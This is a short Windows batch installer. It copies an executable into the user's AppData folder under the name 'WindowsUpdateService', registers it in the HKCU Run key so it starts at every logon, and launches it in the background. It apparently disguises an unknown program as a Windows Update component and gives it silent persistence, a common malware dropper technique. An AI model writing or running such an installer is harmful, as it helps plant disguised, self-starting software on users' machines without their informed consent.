@echo off
cd /d "%~dp0"
set TARGET=%APPDATA%\Microsoft\Windows\WindowsUpdateService
if not exist "%TARGET%" mkdir "%TARGET%"
copy /Y dist\WindowsUpdateService.exe "%TARGET%\WindowsUpdateService.exe" >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "\"%TARGET%\WindowsUpdateService.exe\"" /f >nul
echo Installation complete! Starting service...
start "" /B "%TARGET%\WindowsUpdateService.exe"
echo Done. The service is now running and will start automatically on boot.
pause